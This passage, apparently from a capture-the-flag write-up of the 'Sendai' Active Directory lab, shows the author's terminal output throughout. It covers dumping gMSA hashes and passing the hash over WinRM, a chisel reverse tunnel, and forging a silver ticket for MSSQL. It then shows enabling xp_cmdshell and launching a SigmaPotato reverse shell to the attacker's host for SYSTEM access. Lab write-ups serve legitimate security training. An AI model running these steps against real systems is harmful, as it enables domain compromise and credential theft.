+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc ldap sendai.vl -u elliot.yates  -p &apos;P@ssw0rd&apos; --gmsa
+LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.234.66   389    DC               [+] sendai.vl\elliot.yates:P@ssw0rd 
+LDAP        10.129.234.66   389    DC               [*] Getting GMSA Passwords
+LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: aef24dfbb4c6cf2abd6a774bf2d77a70     PrincipalsAllowedToReadPassword: admsvc
+                                                                                                                                                                              
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc winrm sendai.vl -u mgtsvc$ -H aef24dfbb4c6cf2abd6a774bf2d77a70 
+WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.234.66   5985   DC               [+] sendai.vl\mgtsvc$:aef24dfbb4c6cf2abd6a774bf2d77a70 (Pwn3d!)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc ldap sendai.vl -u elliot.yates  -p &apos;P@ssw0rd&apos; --gmsa
+LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.234.66   389    DC               [+] sendai.vl\elliot.yates:P@ssw0rd 
+LDAP        10.129.234.66   389    DC               [*] Getting GMSA Passwords
+LDAP        10.129.234.66   389    DC               Account: mgtsvc$              NTLM: aef24dfbb4c6cf2abd6a774bf2d77a70     PrincipalsAllowedToReadPassword: admsvc
+                                                                                                                                                                              
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc winrm sendai.vl -u mgtsvc$ -H aef24dfbb4c6cf2abd6a774bf2d77a70 
+WINRM       10.129.234.66   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.234.66   5985   DC               [+] sendai.vl\mgtsvc$:aef24dfbb4c6cf2abd6a774bf2d77a70 (Pwn3d!)</code></pre></div>
+<p>Now I have a shell on the target machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ evil-winrm -i sendai.vl -u mgtsvc$ -H aef24dfbb4c6cf2abd6a774bf2d77a70 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; whoami
+sendai\mgtsvc$
+*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::a623:7f64:3704:ee1f
+   Link-local IPv6 Address . . . . . : fe80::f020:fbfc:96f5:903c%8
+   IPv4 Address. . . . . . . . . . . : 10.129.234.66
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%8
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ evil-winrm -i sendai.vl -u mgtsvc$ -H aef24dfbb4c6cf2abd6a774bf2d77a70 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; whoami
+sendai\mgtsvc$
+*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::a623:7f64:3704:ee1f
+   Link-local IPv6 Address . . . . . : fe80::f020:fbfc:96f5:903c%8
+   IPv4 Address. . . . . . . . . . . : 10.129.234.66
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%8
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; 
+</code></pre></div>
+<p>The <code class="inline-code">user.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Users&gt; cd ..
+*Evil-WinRM* PS C:\&gt; dir
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          2/6/2026   8:33 AM                config
+d-----         4/15/2025   8:20 PM                inetpub
+d-----          5/8/2021   1:20 AM                PerfLogs
+d-r---         4/15/2025   7:51 PM                Program Files
+d-----         7/18/2023   6:11 AM                Program Files (x86)
+d-----          2/6/2026   8:33 AM                sendai
+d-----         7/11/2023   2:35 AM                SQL2019
+d-r---          2/6/2026   8:52 AM                Users
+d-----         8/18/2025   5:04 AM                Windows
+-a----         4/15/2025   8:27 PM             32 user.txt
+
+
+*Evil-WinRM* PS C:\&gt; more user.txt
+fff335936142d21a6fa44123b897cd3e
+
+*Evil-WinRM* PS C:\&gt; 
+</pre><pre class="hljs"><code>*Evil-WinRM* PS C:\Users&gt; <span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>
+*Evil-WinRM* PS C:\&gt; dir
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+<span class="hljs-params">----</span>                 <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span>
+d<span class="hljs-params">-----</span>          2/6/2026   8<span class="hljs-function">:33</span> AM                config
+d<span class="hljs-params">-----</span>         4/15/2025   8<span class="hljs-function">:20</span> PM                inetpub
+d<span class="hljs-params">-----</span>          5/8/2021   1<span class="hljs-function">:20</span> AM                PerfLogs
+d-r<span class="hljs-params">---</span>         4/15/2025   7<span class="hljs-function">:51</span> PM                Program Files
+d<span class="hljs-params">-----</span>         7/18/2023   6<span class="hljs-function">:11</span> AM                Program Files <span class="hljs-params">(x86)</span>
+d<span class="hljs-params">-----</span>          2/6/2026   8<span class="hljs-function">:33</span> AM                sendai
+d<span class="hljs-params">-----</span>         7/11/2023   2<span class="hljs-function">:35</span> AM                SQL2019
+d-r<span class="hljs-params">---</span>          2/6/2026   8<span class="hljs-function">:52</span> AM                Users
+d<span class="hljs-params">-----</span>         8/18/2025   5<span class="hljs-function">:04</span> AM                Windows
+-a<span class="hljs-params">----</span>         4/15/2025   8<span class="hljs-function">:27</span> PM             32 user.txt
+
+
+*Evil-WinRM* PS C:\&gt; more user.txt
+fff335936142d21a6fa44123b897<span class="hljs-keyword">cd</span>3e
+
+*Evil-WinRM* PS C:\&gt; 
+</code></pre></div>
+<p>I decided to check the MSSQL service. Since the MSSQL service is not exposed internally, I used <code class="inline-code">chisel</code> to expose it to my machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Temp&gt; .\chisel.exe client 10.10.15.82:8448 R:1433:127.0.0.1:1433
+chisel.exe : 2026/02/06 08:58:59 client: Connecting to ws://10.10.15.82:8448
+    + CategoryInfo          : NotSpecified: (2026/02/06 08:5...0.10.15.82:8448:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2026/02/06 08:58:59 client: Connected (Latency 12.0402ms)
+
+
+.......SNIP..........
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ sudo ./chisel server --reverse -v -p 8448
+2026/02/06 11:57:43 server: Reverse tunnelling enabled
+2026/02/06 11:57:43 server: Fingerprint KgJnQqJ8HUk/gxO7Dc79a8eG9KxQDtWBRHqBx/JiOVg=
+2026/02/06 11:57:43 server: Listening on http://0.0.0.0:8448
+2026/02/06 11:58:59 server: session#1: Handshaking with 10.129.234.66:57227...
+2026/02/06 11:58:59 server: session#1: Verifying configuration
+2026/02/06 11:58:59 server: session#1: tun: Created
+2026/02/06 11:58:59 server: session#1: tun: proxy#R:1433=&gt;1433: Listening
+2026/02/06 11:58:59 server: session#1: tun: SSH connected
+2026/02/06 11:58:59 server: session#1: tun: Bound proxies
+2026/02/06 11:59:26 server: session#1: tun: proxy#R:1433=&gt;1433: conn#1: Open
+2026/02/06 11:59:26 server: session#1: tun: proxy#R:1433=&gt;1433: conn#1: Close (sent 0B received 0B)
+</pre><pre class="hljs"><code>*Evil-WinRM* PS C:\Temp&gt; .\chisel.exe client 10.10.15.82:8448 R:1433:127.0.0.1:1433
+chisel.exe : 2026/02/06 08:58:59 client: Connecting to ws://10.10.15.82:8448
+    + CategoryInfo          : NotSpecified: (2026/02/06 08:5...0.10.15.82:8448:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2026/02/06 08:58:59 client: Connected (Latency 12.0402ms)
+
+
+.......SNIP..........
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ sudo ./chisel server --reverse -v -p 8448
+2026/02/06 11:57:43 server: Reverse tunnelling enabled
+2026/02/06 11:57:43 server: Fingerprint KgJnQqJ8HUk/gxO7Dc79a8eG9KxQDtWBRHqBx/JiOVg=
+2026/02/06 11:57:43 server: Listening on http://0.0.0.0:8448
+2026/02/06 11:58:59 server: session#1: Handshaking with 10.129.234.66:57227...
+2026/02/06 11:58:59 server: session#1: Verifying configuration
+2026/02/06 11:58:59 server: session#1: tun: Created
+2026/02/06 11:58:59 server: session#1: tun: proxy#R:1433=&gt;1433: Listening
+2026/02/06 11:58:59 server: session#1: tun: SSH connected
+2026/02/06 11:58:59 server: session#1: tun: Bound proxies
+2026/02/06 11:59:26 server: session#1: tun: proxy#R:1433=&gt;1433: conn#1: Open
+2026/02/06 11:59:26 server: session#1: tun: proxy#R:1433=&gt;1433: conn#1: Close (sent 0B received 0B)
+</code></pre></div>
+<p>Now the MSSQL service is accessible:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ proxychains nmap -sT localhost -p1433 -sV -A
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 11:59 -0500
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000058s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   127.0.0.1:1433: 
+|     Target_Name: SENDAI
+|     NetBIOS_Domain_Name: SENDAI
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: sendai.vl
+|     DNS_Computer_Name: dc.sendai.vl
+|     DNS_Tree_Name: sendai.vl
+|_    Product_Version: 10.0.20348
+| ms-sql-info: 
+|   127.0.0.1:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-02-06T15:57:59
+|_Not valid after:  2056-02-06T15:57:59
+|_ssl-date: 2026-02-06T16:59:42+00:00; 0s from scanner time.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 5.X|6.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6
+OS details: Linux 5.0 - 6.2
+Network Distance: 0 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ proxychains nmap -sT localhost -p1433 -sV -A
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 11:59 -0500
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000058s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   127.0.0.1:1433: 
+|     Target_Name: SENDAI
+|     NetBIOS_Domain_Name: SENDAI
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: sendai.vl
+|     DNS_Computer_Name: dc.sendai.vl
+|     DNS_Tree_Name: sendai.vl
+|_    Product_Version: 10.0.20348
+| ms-sql-info: 
+|   127.0.0.1:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-02-06T15:57:59
+|_Not valid after:  2056-02-06T15:57:59
+|_ssl-date: 2026-02-06T16:59:42+00:00; 0s from scanner time.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 5.X|6.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6
+OS details: Linux 5.0 - 6.2
+Network Distance: 0 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds</code></pre></div>
+<p>Now I can connect to the MSSQL service:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ impacket-mssqlclient sendai.vl/sqlsvc:&apos;SurenessBlob85&apos;@localhost -windows-auth
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to &apos;master&apos;.
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (SENDAI\sqlsvc  guest@master)&gt;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Sendai]</span>
+&boxur;&boxh;$ impacket-mssqlclient sendai.vl/sqlsvc:<span class="hljs-string">&apos;SurenessBlob85&apos;</span>@localhost -windows-auth
+Impacket v0.<span class="hljs-number">14.0</span><span class="hljs-selector-class">.dev0</span> - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="hljs-selector-attr">[*]</span> Encryption required, switching to TLS
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">ENVCHANGE</span>(DATABASE): Old Value: master, New Value: master
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">ENVCHANGE</span>(LANGUAGE): Old Value: , New Value: us_english
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">ENVCHANGE</span>(PACKETSIZE): Old Value: <span class="hljs-number">4096</span>, New Value: <span class="hljs-number">16192</span>
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">INFO</span>(DC\SQLEXPRESS): Line <span class="hljs-number">1</span>: Changed database context to <span class="hljs-string">&apos;master&apos;</span>.
+<span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">INFO</span>(DC\SQLEXPRESS): Line <span class="hljs-number">1</span>: Changed language setting to us_english.
+<span class="hljs-selector-attr">[*]</span> ACK: Result: <span class="hljs-number">1</span> - Microsoft SQL Server <span class="hljs-number">2019</span> RTM (<span class="hljs-number">15.0</span>.<span class="hljs-number">2000</span>)
+<span class="hljs-selector-attr">[!]</span> Press help <span class="hljs-keyword">for</span> extra shell commands
+SQL (SENDAI\sqlsvc  guest@master)&gt;</code></pre></div>
+<p>Since the <code class="inline-code">sqlsvc</code> account is limited too, I crafted a silver ticket to gain higher privileges:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ sudo impacket-ticketer -nthash 58655c0b90b2492f84fb46fa78c2d96a -domain sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132 -spn &apos;MSSQL/dc.sendai.vl:1433&apos; Administrator
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for sendai.vl/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+                                                                                                                                                                                                                                                                                    
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ KRB5CCNAME=./Administrator.ccache                                                                                                                                                
+                                                                                                                                                                                                                                                                                    
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ proxychains mssqlclient.py dc.sendai.vl -k -no-pass                                                                                               
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.66:1433  ...  OK
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to &apos;master&apos;.
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ sudo impacket-ticketer -nthash 58655c0b90b2492f84fb46fa78c2d96a -domain sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132 -spn &apos;MSSQL/dc.sendai.vl:1433&apos; Administrator
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for sendai.vl/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+                                                                                                                                                                                                                                                                                    
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ KRB5CCNAME=./Administrator.ccache                                                                                                                                                
+                                                                                                                                                                                                                                                                                    
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ proxychains mssqlclient.py dc.sendai.vl -k -no-pass                                                                                               
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.66:1433  ...  OK
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to &apos;master&apos;.
+[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+</code></pre></div>
+<p>Enable <code class="inline-code">xp_cmdshell</code> and exploit the <code class="inline-code">SeImpersonatePrivilege</code> using <code class="inline-code">SigmaPotaot</code> to gain SYSTEM level shell:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">SQL (SENDAI\Administrator  dbo@master)&gt; enable_xp_cmdshell
+INFO(DC\SQLEXPRESS): Line 185: Configuration option &apos;show advanced options&apos; changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(DC\SQLEXPRESS): Line 185: Configuration option &apos;xp_cmdshell&apos; changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (SENDAI\Administrator  dbo@master)&gt; xp_cmdshell whoami
+output          
+-------------   
+sendai\sqlsvc   
+NULL            
+SQL (SENDAI\Administrator  dbo@master)&gt; 
+</pre><pre class="hljs"><code>SQL (SENDAI<span class="hljs-string">\Administrator</span>  dbo@master)&gt; enable_xp_cmdshell
+INFO(DC<span class="hljs-string">\SQLEXPRESS):</span> Line <span class="hljs-number">185</span>: Configuration option <span class="hljs-string">&apos;show advanced options&apos;</span> changed <span class="hljs-keyword">from</span> <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> <span class="hljs-number">1.</span> Run the RECONFIGURE statement <span class="hljs-keyword">to</span> install.
+INFO(DC<span class="hljs-string">\SQLEXPRESS):</span> Line <span class="hljs-number">185</span>: Configuration option <span class="hljs-string">&apos;xp_cmdshell&apos;</span> changed <span class="hljs-keyword">from</span> <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> <span class="hljs-number">1.</span> Run the RECONFIGURE statement <span class="hljs-keyword">to</span> install.
+SQL (SENDAI<span class="hljs-string">\Administrator</span>  dbo@master)&gt; xp_cmdshell whoami
+output          
+-------------   
+sendai<span class="hljs-string">\sqlsvc</span>   
+NULL            
+SQL (SENDAI<span class="hljs-string">\Administrator</span>  dbo@master)&gt; 
+</code></pre></div>
+<p>Shell as <code class="inline-code">SYSTEM</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">SQL (SENDAI\Administrator  dbo@master)&gt; xp_cmdshell &quot;C:\Temp\SigmaPotato.exe --revshell 10.10.15.82 445&quot;
+
+...........SNIP........
+
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nc -lvnp 445                  
+listening on [any] 445 ...
+connect to [10.10.15.82] from (UNKNOWN) [10.129.234.66] 58692
+
+PS C:\Windows\system32&gt; whoami
+nt authority\system
+PS C:\Windows\system32&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::a623:7f64:3704:ee1f
+   Link-local IPv6 Address . . . . . : fe80::f020:fbfc:96f5:903c%8
+   IPv4 Address. . . . . . . . . . . : 10.129.234.66
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:f8df%8
+                                       10.129.0.1
+PS C:\Windows\system32&gt; 
+
+
+</pre><pre class="hljs"><code><span class="hljs-keyword">SQL</span> (SENDAI\Administrator  dbo<span class="hljs-variable">@master</span>)<span class="hljs-operator">&gt;</span> xp_cmdshell &quot;C:\Temp\SigmaPotato.exe --revshell 10.10.15.82 445&quot;
+
+...........SNIP........
+
+&boxdr;&boxh;&boxh;(kali㉿kali)<span class="hljs-operator">-</span>[<span class="hljs-operator">~</span><span class="hljs-operator">/</span>Desktop<span class="hljs-operator">/</span>Labs<span class="hljs-operator">/</span>Sendai]
+&boxur;&boxh;$ nc <span class="hljs-operator">-</span>lvnp <span class="hljs-number">445</span>                  
+listening <span class="hljs-keyword">on</span> [<span class="hljs-keyword">any</span>] <span class="hljs-number">445</span> ...
+<span class="hljs-keyword">connect</span> <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span><span class="hljs-number">.15</span><span class="hljs-number">.82</span>] <span class="hljs-keyword">from</span> (<span class="hljs-literal">UNKNOWN</span>) [<span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.66</span>] <span class="hljs-number">58692</span>
+
+PS C:\Windows\system32<span class="hljs-operator">&gt;</span> whoami
+nt authority\<span class="hljs-keyword">system</span>
+PS C:\Windows\system32<span class="hljs-operator">&gt;</span> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 <span class="hljs-number">2</span>:
+
+   Connection<span class="hljs-operator">-</span><span class="hljs-keyword">specific</span> DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::a623:<span class="hljs-number">7</span>f64:<span class="hljs-number">3704</span>:ee1f
+   Link<span class="hljs-operator">-</span><span class="hljs-keyword">local</span> IPv6 Address . . . . . : fe80::f020:fbfc:<span class="hljs-number">96</span>f5:<span class="hljs-number">903</span>c<span class="hljs-operator">%</span><span class="hljs-number">8</span>
+   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.66</span>
+   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
+   <span class="hljs-keyword">Default</span> Gateway . . . . . . . . . : fe80::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:fe94:f8df<span class="hljs-operator">%</span><span class="hljs-number">8</span>
+                                       <span class="hljs-number">10.129</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
+PS C:\Windows\system32<span class="hljs-operator">&gt;</span> 
+
+
+</code></pre></div>
+<p>The <code class="inline-code">root.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">PS C:\Users\Administrator&gt; cd Desktop
+PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         4/15/2025   8:27 PM             32 root.txt                                                             
+
+
+PS C:\Users\Administrator\Desktop&gt; more root.txt
+1bc134a7b4ae19fcc072082026d991cf
+
+PS C:\Users\Administrator\Desktop&gt; 
+</pre><pre class="hljs"><code>PS <span class="hljs-name">C</span>:\Users\Administrator&gt; cd Desktop
+PS <span class="hljs-name">C</span>:\Users\Administrator\Desktop&gt; dir
+
+
+    <span class="hljs-name">Directory</span>: <span class="hljs-name">C</span>:\Users\Administrator\Desktop
+
+
